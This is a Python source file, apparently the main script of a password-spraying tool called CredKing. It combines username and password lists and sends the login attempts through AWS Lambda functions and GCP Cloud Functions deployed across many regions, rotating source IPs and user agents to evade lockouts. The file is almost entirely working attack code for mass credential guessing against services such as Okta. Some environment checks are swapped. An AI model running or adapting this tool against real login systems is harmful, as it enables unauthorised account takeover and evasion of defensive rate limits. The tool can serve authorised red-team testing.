import re, argparse, importlib
import credkingGCP
import credkingAWS
import sys
import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock, Thread
import queue, random
import math

# GCP Locations
location_names = ["us-central1", "us-east1", "us-east4", "europe-west1", "asia-east2"]

# AWS Regions
regions = [
    'us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'eu-west-3',
    'ap-northeast-1', 'ap-northeast-2', 'ap-south-1',
    'ap-southeast-1', 'ap-southeast-2', 'ca-central-1',
    'eu-central-1', 'eu-west-1', 'eu-west-2', 'sa-east-1',
]

credentials = {'accounts': []}
lock = Lock()
q = queue.Queue()

_service_account_email = ""


def main(args, pargs):
    global start_time, end_time, time_lapse

    # Required Fields
    thread_count = args.threads
    plugin = args.plugin
    username_file = args.userfile
    password_file = args.passwordfile
    user_agent_file = args.useragentfile
    environments = args.env
    gcp_enabled = False
    aws_enabled = False
    sa_file = None
    access_key = None
    secret_access_key = None

    for env in environments:
        if env == "aws":
            # GCP Required Fields
            sa_file = args.sa_creds_file
            if sa_file is not None:
                print("Contains all the necessary GCP Fields")
            else:
                print("Field requirements are not met")
                sys.exit(0)
            aws_enabled = True
        elif env == "gcp":
            # AWS Required Fields
            access_key = args.access_key
            secret_access_key = args.secret_access_key
            if access_key is not None and secret_access_key is not None:
                print("Contains all the necessary AWS Fields")
            else:
                print("Field requirements are not met")
                sys.exit(0)
            gcp_enabled = True
        else:
            print("Field requirements are not met")
            sys.exit(0)

    # Optional Fields
    useragent_file = args.useragentfile

    pluginargs = {}
    for i in range(0, len(pargs) - 1):
        key = pargs[i].replace("--", "")
        pluginargs[key] = pargs[i + 1]

    start_time = datetime.datetime.utcnow()
    log_entry(f"Execution started at: {start_time}")

    # Prepare credential combinations into the queue
    load_credentials(username_file, password_file, useragent_file)

    threads = thread_count
    # TODO: Need to figure out how to do this dynamically
    total_functions_available = len(location_names) + len(regions)
    if thread_count > total_functions_available:
        threads = len(total_functions_available)
    elif thread_count > len(credentials['accounts']):
        threads = len(credentials['accounts'])

    print(math.floor(thread_count/len(environments)))
    total_threads = threads
    threads = math.floor(total_threads/len(environments))
    log_entry(f"Number of threads per environment: {threads}")

    functions = []
    service = None
    bucket = None
    if gcp_enabled:
        sa_credentials = credkingGCP.service_account.Credentials.from_service_account_file(sa_file)
        # TODO: Evaluate if this variable is needed
        global _service_account_email
        _service_account_email = sa_credentials.service_account_email

        service = credkingGCP.build('cloudfunctions', 'v1', credentials=sa_credentials)
        storage_service = credkingGCP.build('storage', 'v1', credentials=sa_credentials)

        # Creating a bucket
        bucket_name = f"credking_{next(generate_random())}"
        body = {'name': bucket_name}
        log_entry(storage_service.buckets().insert(project=sa_credentials.project_id, predefinedAcl="projectPrivate",
                                                   body=body).execute())

        # Uploading a file from a created bucket
        storage_client = credkingGCP.storage.Client(project=sa_credentials.project_id, credentials=sa_credentials)
        bucket = storage_client.bucket(bucket_name)
        source_url = credkingGCP.create_bucket(bucket, 'okta')

        locations = service.projects().locations()
        functions = credkingGCP.create_functions(sa_credentials, locations, sa_credentials.project_id, source_url, threads)

        for x in functions:
            credkingGCP.check_function(locations.functions(), x)
    arns = []
    if aws_enabled:
        # Prepare the deployment package
        zip_path = credkingAWS.create_zip(plugin)

        # Create lambdas based on thread count
        arns = credkingAWS.load_lambdas(access_key, secret_access_key, threads, zip_path)

    # Start Spray
    serverlessList = arns + functions
    with ThreadPoolExecutor(max_workers=len(serverlessList)) as executor:
        for serverless in serverlessList:
            log_entry(f'Launching spray {serverless}...')
            # access_key, secret_access_key, args, sa_credentials, item, serverless
            executor.submit(start_spray,
                            access_key=access_key,
                            secret_access_key=secret_access_key,
                            args=pluginargs,
                            sa_credentials=sa_credentials,
                            serverless=serverless
                            )

    '''
    #with ThreadPoolExecutor(max_workers=total_threads) as executor:
    #while True:
    for item in q.queue:
        item = None
        if q.empty():
            break
        else:
            item = q.get()
        if item is None:
            break

        for serverless in serverlessList:
            if str(serverless).startswith('arn'):
                log_entry('Launching spray using {}...'.format(serverless))
                credkingAWS.start_spray(access_key=access_key,secret_access_key=secret_access_key,arn=serverless,args=pluginargs,item=item)
                
                #executor.submit(
                #    credkingAWS.start_spray,
                #    access_key=access_key,
                #    secret_access_key=secret_access_key,
                #    arn=arn,
                #    args=pluginargs,
                #    item=item
                #)
                
            else:
                log_entry('Launching spray using {}...'.format(serverless))
                credkingGCP.start_spray(sa_credentials=sa_credentials,function_name=serverless,args=pluginargs,item=item)
                
                #executor.submit(
                #    credkingGCP.start_spray,
                #    sa_credentials=sa_credentials,
                #    function_name=function_name,
                #    args=pluginargs,
                #    item=item
                #)
                
        #q.task_done()
    '''

    if gcp_enabled:
        for function_name in functions:
            credkingGCP.delete_function(service.projects().locations().functions(), function_name)
        credkingGCP.delete_bucket(bucket)
        credkingGCP.delete_zip()

    if aws_enabled:
        # Remove AWS resources and build zips
        credkingAWS.clean_up(access_key, secret_access_key, only_lambdas=True)


def start_spray(access_key, secret_access_key, args, sa_credentials, serverless):
    while True:
        item = q.get_nowait()

        if item is None:
            break
        if str(serverless).startswith('arn'):
            credkingAWS.start_spray(access_key=access_key, secret_access_key=secret_access_key, arn=serverless,
                                    args=args, item=item)
        else:
            credkingGCP.start_spray(sa_credentials=sa_credentials, function_name=serverless, args=args, item=item)
        q.task_done()


def generate_random():
    seed = random.getrandbits(32)
    while True:
        yield seed
        seed += 1


def load_file(filename):
    if filename:
        return [line.strip() for line in open(filename, 'r')]


def load_credentials(user_file, password_file, useragent_file=None):
    log_entry('Loading credentials from {} and {}'.format(user_file, password_file))

    users = load_file(user_file)
    passwords = load_file(password_file)
    if useragent_file is not None:
        useragents = load_file(useragent_file)
    else:
        useragents = ["Python CredKing (https://github.com/ustayready/CredKing)"]

    for user in users:
        for password in passwords:
            cred = {}
            cred['username'] = user
            cred['password'] = password
            cred['useragent'] = random.choice(useragents)
            credentials['accounts'].append(cred)

    for cred in credentials['accounts']:
        q.put(cred)


def log_entry(entry):
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
    print('[{}] {}'.format(ts, entry))


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    # Required Fields
    parser.add_argument('--plugin', help='spraying plugin', required=True)
    parser.add_argument('--threads', help='thread count (default: 1)',
                        type=int, default=1)
    parser.add_argument('--userfile', help='username file', required=True)
    parser.add_argument('--passwordfile', help='password file', required=True)
    parser.add_argument('--env', help="Serverless environments", required=True, action='append')

    # Optional Fields
    parser.add_argument('--useragentfile', help='useragent file', required=False)

    # AWS Environment Required Fields
    parser.add_argument('--access_key', help='aws access key', required=False)
    parser.add_argument('--secret_access_key', help='aws secret access key', required=False)

    # GCP Environment Required Fields
    parser.add_argument('--sa_creds_file', help="GCP Json Keys", required=False)

    args, plugin_args = parser.parse_known_args()
    main(args, plugin_args)
